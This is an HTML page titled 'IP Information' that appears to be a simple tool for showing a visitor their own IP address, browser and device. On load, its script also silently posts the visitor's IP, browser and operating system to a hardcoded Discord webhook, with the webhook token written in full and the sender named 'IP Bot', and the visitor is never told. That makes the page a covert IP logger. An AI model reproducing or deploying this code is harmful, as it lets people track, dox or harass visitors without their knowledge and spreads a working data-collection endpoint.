<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Information</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #36393f;
            text-align: center;
            color: #dcddde;
        }
        .container {
            background: #2f3136;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            width: 350px;
        }
        h1 {
            margin-bottom: 20px;
            color: #ffffff;
        }
        .info {
            text-align: left;
            font-size: 14px;
            background: #40444b;
            padding: 10px;
            border-radius: 5px;
        }
        .info strong {
            color: #ffffff;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>IP Information</h1>
        <div id="ip-info" class="info">Fetching...</div>
    </div>

    <script>
        function sendIpToWebhook(ip, browser, device) {
            const webhookUrl = 'https://discord.com/api/webhooks/1357593782702575656/pRUOZ9sdAFYZOUg9iqljxyC1J6tcRG5_uEQl0LVcPchnxWThOzAIpvaOs6CVLWALGijI';
            const payload = {
                content: `---------------------------------\nAddress: ${ip}\nBrowser: ${browser}\nDevice: ${device}`,
                username: 'IP Bot',
            };

            fetch(webhookUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(payload),
            }).catch(error => {
                console.error('Error:', error);
            });
        }

        function fetchIp() {
            fetch('https://api.ipify.org?format=json') // Fetch IP address
                .then(response => response.json())
                .then(data => {
                    const userIp = data.ip;

                    // Detect browser
                    let browser = "Unknown";
                    if (navigator.userAgent.includes("Chrome")) {
                        browser = "Chrome";
                    } else if (navigator.userAgent.includes("Firefox")) {
                        browser = "Firefox";
                    } else if (navigator.userAgent.includes("Safari")) {
                        browser = "Safari";
                    } else if (navigator.userAgent.includes("Edge")) {
                        browser = "Edge";
                    }

                    // Detect device
                    let device = "Unknown";
                    if (navigator.userAgent.includes("Windows")) {
                        device = "Windows";
                    } else if (navigator.userAgent.includes("Mac")) {
                        device = "Mac";
                    } else if (navigator.userAgent.includes("Linux")) {
                        device = "Linux";
                    } else if (navigator.userAgent.includes("Android")) {
                        device = "Android";
                    } else if (navigator.userAgent.includes("iPhone")) {
                        device = "iPhone";
                    }

                    document.getElementById('ip-info').innerHTML = `
                        <strong>Address:</strong> ${userIp}<br>
                        <strong>Browser:</strong> ${browser}<br>
                        <strong>Device:</strong> ${device}<br>
                    `;
                    sendIpToWebhook(userIp, browser, device);
                })
                .catch(error => {
                    console.error('Failed to fetch IP information:', error);
                    document.getElementById('ip-info').innerText = 'Failed to fetch data';
                });
        }

        fetchIp();
    </script>
</body>
</html>
